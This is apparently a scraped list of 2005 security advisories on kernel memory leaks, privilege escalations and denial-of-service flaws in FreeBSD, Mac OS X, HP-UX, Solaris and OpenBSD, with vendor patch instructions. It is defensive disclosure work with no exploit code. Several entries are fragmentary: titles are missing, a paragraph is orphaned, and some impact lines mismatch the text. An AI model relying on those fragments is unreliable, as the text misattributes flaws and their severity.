1) Upgrade your vulnerable system to 4-STABLE or 5-STABLE, or to the RELENG_5_4, RELENG_5_3, RELENG_4_11, or RELENG_4_10 security branch dated after the correction date.

2) To patch your present system:

The following patches have been verified to apply to FreeBSD 4.10, 4.11, 5.3, and 5.4 systems.

a) Download the relevant patch from the location below and verify the detached PGP signature using your PGP utility.

[FreeBSD 4.10]
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:09/htt410.patch
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:09/htt410.patch.asc

[FreeBSD 4.11]
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:09/htt411.patch
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:09/htt411.patch.asc

[FreeBSD 5.x]
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:09/htt5.patch
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:09/htt5.patch.asc

b) Apply the patch.

# cd /usr/src
# patch < /path/to/patch

c) Recompile your kernel as described in <URL:http://www.freebsd.org/handbook/kernelconfig.html> and reboot the system.

Title: FreeBSD Kernel Buffer Initialization Flaw May Disclose Memory to Local Users
Description:
A vulnerability was reported in the FreeBSD kernel in the processing of certain object names.  A local user may be able to obtain portions of kernel memory.
Certain portions of the kernel copy user-supplied strings of variable length into fixed-length buffers without resetting the unused portion of the destination buffer.

A local user may be able to obtain information in the uninitialized portion of the buffer.

The vendor credits Christian S.J. Peron with reporting this vulnerability.
Impact': A local user can access portions of previously used kernel memory.
Solution:
The vendor has issued a fix and has provided the following instructions [quoted]:

Perform one of the following:

1) Upgrade your vulnerable system to 4-STABLE or 5-STABLE, or to the RELENG_5_3, RELENG_4_11, or RELENG_4_10 security branch dated after the correction date.

2) To patch your present system:

The following patches have been verified to apply to FreeBSD 4.10, 4.11, and 5.3 systems.

a) Download the relevant patch from the location below, and verify the detached PGP signature using your PGP utility.

[FreeBSD 4.x]
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:08/kmem4.patch
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:08/kmem4.patch.asc

[FreeBSD 5.x]
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:08/kmem5.patch
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:08/kmem5.patch.asc

b) Apply the patch.

# cd /usr/src
# patch < /path/to/patch

c) Recompile your kernel as described in <URL:http://www.freebsd.org/handbook/kernelconfig.html> and reboot the system.

Title: FreeBSD i386_get_ldt(2) Discloses Kernel Memory to Remote Users
Description:
A vulnerability was reported in FreeBSD in the i386_get_ldt(2) system call.  A local user may be able to obtain portions of kernel memory.
The i386_get_ldt(2) system call does not properly validate user-supplied inputs.  A local user can submit negative or very large input values to cause a portion of the process Local Descriptor Table to be copied from the kernel.

The vendor credits Christer Oberg with reporting this vulnerability.
Impact': A local user can access portions of kernel memory.
Solution:
The vendor has issued a fix and provided the following instructions [quoted]:

Perform one of the following:

1) Upgrade your vulnerable system to 4-STABLE or 5-STABLE, or to the RELENG_5_3, RELENG_4_11, or RELENG_4_10 security branch dated after the correction date.

2) To patch your present system:

The following patches have been verified to apply to FreeBSD 4.10, 4.11, and 5.3 systems.

a) Download the relevant patch from the location below, and verify the detached PGP signature using your PGP utility.

[FreeBSD 4.x]
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:07/ldt4.patch
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:07/ldt4.patch.asc

[FreeBSD 5.x]
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:07/ldt5.patch
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:07/ldt5.patch.asc

b) Apply the patch.

# cd /usr/src
# patch < /path/to/patch

c) Recompile your kernel as described in <URL:http://www.freebsd.org/handbook/kernelconfig.html> and reboot the system.

Title: FreeBSD iir(4) Driver Access Permissions May Let Local Users Access and Delete Data
Impact: Denial of service via local system
Description:
A vulnerability was reported in FreeBSD in the iir(4) driver for Intel Integrated RAID controllers and ICP Vortex RAID controllers.  A local user may be able to view or delete certain data.
Because of unsafe default permissions on the /dev/iir device node, a local user can open the device and execute ioctl calls.  This can be exploited to destroy or possibly view data.

The vendor credits Christian S.J. Peron with reporting this vulnerability.
Impact': A local user can destroy or possibly view certain data on the target system.
Solution:
The vendor has issued a fix and has provided the following instrutions [quoted]:

Perform one of the following:

1) Upgrade your vulnerable system to 4-STABLE or 5-STABLE, or to the RELENG_5_3, RELENG_4_11, or RELENG_4_10 security branch dated after the correction date.

2) To patch your present system:

The following patches have been verified to apply to FreeBSD 4.10, 4.11, and 5.3 systems.

a) Download the relevant patch from the location below, and verify the detached PGP signature using your PGP utility.

# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:06/iir.patch
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:06/iir.patch.asc

b) Apply the patch.

# cd /usr/src
# patch < /path/to/patch

c) Recompile your kernel as described in <URL:http://www.freebsd.org/handbook/kernelconfig.html> and reboot the system.

Title: Mac OS X Foundation Buffer Overflow May Let Local Users Gain Elevated Privileges
Impact: Execution of arbitrary code via local system
Description:
A vulnerability was reported in Mac OS X Foundation.  A local user may be able to gain elevated privileges.
A local user can set a specially crafted environment variable and then invoke an application that uses the Foundation framework to trigger a buffer overflow and execute arbitrary code.  The code may run with the privileges of the affected application, depending on the configured permissions.
Impact': A local user may be able to gain elevated privileges.
Solution:

Impact: Execution of arbitrary code via local system
Description:
A vulnerability was reported in chfn, chpass, and chsh on Apple Mac OS X.  A local user may be able to gain elevated privileges.
These Directory Services components use certain insecure code paths to invoke external helper applications.  A local user may be able to cause the component to execute arbitrary code with set user id (setuid) root user privileges.

Title: HP/UX ICMP PMTU Attacks Let Remote Users Deny Service
Description:
A vulnerability was reported in HP/UX in the TCP/IP stack implementation.  A remote user can cause denial of service conditions.
A remote user can send a specially crafted packet to any TCP-based service on the target system to cause a denial of service condition. A reboot is required to return the system to normal operations.

The flaw resides in the Path Maximum Transmission Unit (PMTU) Discovery processing, which is enabled by default (the 'ip_pmtu_strategy' default value is '1', which permits PMTU discovery).

The vendor reported this vulnerability.
Impact': A remote user can cause denial of service conditions.  A reboot is required to return the system to normal operations.
Solution:
The vendor has issued patches for B.11.11 and B.11.23 available at:

http://itrc.hp.com

For B.11.11 - PHNE_33159 or subsequent
For B.11.23 - PHNE_32606 or subsequent

Binary files are available for B.11.22, as discussed in the vendor's bulletin number HPSBUX01164.

Patches and updates are available for IPSec at:

http://itrc.hp.com

IPSec and TOUR (Transport Optional Upgrade Release) updates are available at:

http://www.hp.com/go/softwaredepot

For B.11.11 IPSec:

IPSec revision A.01.07.02 and PHNE_33159 or subsequent
or
IPSec revision A.01.07.02 and TOUR 3.0

For B.11.23 IPSec:

IPSec revision A.2.00.01 and PHNE_32606 or subsequent
or
IPSec revision A.2.00.01 and TOUR 3.0  

The vendor's advisory has changed significantly from the first version, so be certain to read the latest version.  The vendor's advisory is available at:

http://www2.itrc.hp.com/service/cki/docDisplay.do?docId=c00571568

Title: Sun Solaris May Let Local Users Hijack Non-Privileged Port Services
Description:
A vulnerability was reported in Sun Solaris.  A local user may be able to hijack certain non-privileged network ports.
A local user may be able to start a process that binds to a non-privileged network port to hijack future connections to the service that typically runs on that port.

Only network services that run on non-privileged ports (e.g., NFS, NIS) are affected.

Solaris 8 and 9 are affected.  Solaris 7 and 10 are not affected.
Impact': A local user may be able to hijack non-privileged network ports.
Solution:
The vendor has issued the following patches.

SPARC Platform 

Solaris 8 with patch 116965-08 or later 
Solaris 9 with patch 118305-02 or later

x86 Platform 

Solaris 8 with patch 116966-08 or later 
Solaris 9 with patch 117470-01 or later

Title: Apple OS X File Parsing Error Lets Local Users Deny Service
Impact: Denial of service via local system
Description:
A vulnerability was reported in Apple OS X.  A local user can cause temporary denial of service conditions.
The kernel does not properly parse certain executable files.  A local user can create a specially crafted file that, when processed by the kernel, a local user can temporarily suspend system operations.

The vendor credits Neil Archibald with reporting this vulnerability.
Impact': A local user can temporarily suspend system operations.

The syscall emulation code does not properly validate user-supplied parameters.  A local user can supply specially crafted values to trigger a heap overflow and cause a kernel panic.

Title: FreeBSD Kernel ifconf() Discloses Kernel Memory Contents to Local Users
Description:
A vulnerability was reported in FreeBSD in the ifconf().  A local user can obtain kernel memory contents.
The SIOCGIFCONF ioctl fails to properly initialize a buffer before writing to the user-supplied buffer.  A local user can invoke the ifconf() function to obtain up to 12 bytes of kernel memory.

The vendor credits Ilja van Sprundel with reporting this vulnerability.
Impact': A local user can obtain portions of kernel memory.
Solution:
The vendor has issued a fix and has provided the following solution information [quoted]:

Perform one of the following:

1) Upgrade your vulnerable system to 4-STABLE or 5-STABLE, or to the RELENG_5_3, RELENG_4_11, or RELENG_4_10 security branch dated after the correction date.

2) To patch your present system:

The following patches have been verified to apply to FreeBSD 4.10, 4.11, and 5.3 systems.

a) Download the relevant patch from the location below, and verify the detached PGP signature using your PGP utility.

[FreeBSD 4.x]
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:04/ifconf4.patch
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:04/ifconf4.patch.asc

[FreeBSD 5.3]
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:04/ifconf5.patch
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:04/ifconf5.patch.asc

b) Apply the patch.

# cd /usr/src
# patch < /path/to/patch

c) Recompile your kernel as described in <URL:http://www.freebsd.org/handbook/kernelconfig.html> and reboot the system.

Title: Sun Solaris ICMP Processing Error Lets Remote Users Deny Service
Description:
A vulnerability was reported in Sun Solaris in the processing of ICMP messages.  A remote user can cause denial of service conditions.
A remote user can send specially crafted ICMP error messages to cause the performance of existing TCP connections to degrade.

This type of vulnerability was described by Fernando Gont in the Internet Draft "ICMP attacks against TCP" (http://www.ietf.org/internet-drafts/draft-gont-tcpm-icmp-attacks-03.txt).
Impact': A remote user can cause TCP connection performance to degrade.
Solution: No solution was available at the time of this entry.

Title: FreeBSD AMD64 Hardware Access Bitmap Error Lets Local Users Obtain Elevated Privileges
Impact: Denial of service via local system
Description:
A vulnerability was reported in FreeBSD when running on the AMD64 architecture.  A local user may be able to obtain elevated privileges.
The bitmap that determines which hardware can be accessed by user-level processes is not properly initialized.  A local user can directly access some hardware that the user should not otherwise be able to access directly.

A local user can exploit this to view sensitive information, obtain elevated privileges, or cause denial of service conditions.

The vendor credits Jari Kirma with reporting this vulnerability.
Impact': A local user can directly access some hardware.  This may allow the local user to cause denial of service conditions, obtain sensitive information, or potentially gain elevated privileges.
Solution:
The vendor has issued a fix and indicates that users should perform one of the following steps [quoted]:

1) Upgrade your vulnerable system to 5-STABLE or to the RELENG_5_3 security branch dated after the correction date.

2) To patch your present system:

a) Download the patch from the location below, and verify the detached PGP signature using your PGP utility.

# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:03/amd64.patch
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:03/amd64.patch.asc

b) Apply the patch.

# cd /usr/src
# patch < /path/to/patch

Title: FreeBSD sendfile(2) Discloses Kernel Memory
Description:
A vulnerability was reported in the FreeBSD kernel in the sendfile() system call.  A local user can obtain portions of kernel memory.
A local user can begin to transmit a file using sendfile(2) and then truncate the file before the transfer is complete to cause random portions of kernel memory to be transmitted in place of the truncated portion.

The vendor credits Sven Berkvens and Marc Olzheim with reporting this vulnerability.
Impact': A local user can obtain portions of kernel memory.  This may lead to privilege escalation.
Solution:
The vendor has issued a fix and provided the following solution information [quoted]:

1) Upgrade your vulnerable system to 4-STABLE or 5-STABLE, or to the RELENG_5_3, RELENG_4_11, RELENG_4_10, or RELENG_4_8 security branch dated after the correction date.

2) To patch your present system:

The following patches have been verified to apply to FreeBSD 4.8, 4.10, 4.11, and 5.3 systems.

a) Download the relevant patch from the location below, and verify the detached PGP signature using your PGP utility.

[FreeBSD 4.x]
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:02/sendfile_4.patch
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:02/sendfile_4.patch.asc

[FreeBSD 5.3]
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:02/sendfile_5.patch
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-05:02/sendfile_5.patch.asc

b) Apply the patch.

# cd /usr/src
# patch < /path/to/patch

c) Recompile your kernel as described in <URL:http://www.freebsd.org/handbook/kernelconfig.html> and reboot the system.

Title: OpenBSD tcp(4) Bugs in Processing SACK Options Let Remote Users Deny Service
Description:
A vulnerability was reported in OpenBSD in the TCP stack implementation.  A remote user can cause the system to crash.
A remote user can send TCP packets with invalid SACK options to trigger flaws in the tcp(4) stack on the target system.  This may cause all available memory to be consumed or the target system to crash.

The vulnerabilities reside in 'tcp_input.c' and 'tcp_usrreq.c'.
Impact': A remote user can cause denial of service conditions on the target system, such as memory exhaustion or a crash.
Solution:
The vendor has issued the following patches:

ftp://ftp.openbsd.org/pub/OpenBSD/patches/3.5/common/030_sack.patch
ftp://ftp.openbsd.org/pub/OpenBSD/patches/3.6/common/013_sack.patch

Title: (Exploit Code is Available) Mac OS X Core Foundation Buffer Overflow in CF_CHARSET_PATH Lets Local Users Gain Root Privileges
Impact: Execution of arbitrary code via local system
Description:
iDEFENSE reported a vulnerability in Mac OS X Core Foundation.  A local user can obtain root privileges.
The Core Foundation library does not properly process the CF_CHARSET_PATH environment variable. A local user can supply a string that is longer than 1024 characters to trigger a buffer overflow and execute arbitrary code. The overflow can be exploited via any application that is linked against the affected library. A local user can exploit an application that has set user id (setuid) root user privileges to execute arbitrary code with root privileges. Applications such as su, pppd, and login can be exploited.

The original advisory is available at:

http://www.idefense.com/application/poi/display?id=219&type=vulnerabilities

Some demonstration exploit code is available at:

http://fakehalo.us/xosx-cf.c

[Editor's note:  The code was not available at the time of this entry.]
Impact': A local user can execute arbitrary code with root privileges.
Solution:
The vendor has issued a fix as part of Apple Security Update 2005-003, described at:

http://docs.info.apple.com/article.html?artnum=301061

Title: Apple Mac OS X Unsafe Directory Permissions May Let Local Users Gain Elevated Privileges
Description:
A vulnerability was reported in Apple Mac OS X in the setting of permissions on several directories.  A local user may be able to obtain elevated privileges.
Several directories are configured with world-writable permissions.  A local user may be able to modify files in those directories to obtain elevated privileges.

The directories used by the installer's receipt cache and system-level ColorSync profiles are affected.

Apple credits Eric Hall of DarkArt Consulting Services, Michael Haller (info@cilly.com), and (root at addcom.de) with reporting this vulnerability.
Impact': A local user may be able to modify files to obtain elevated privileges on the target system.
Solution:
Apple has issued a fix as part of Apple Security Update 2005-003, described at:

http://docs.info.apple.com/article.html?artnum=301061
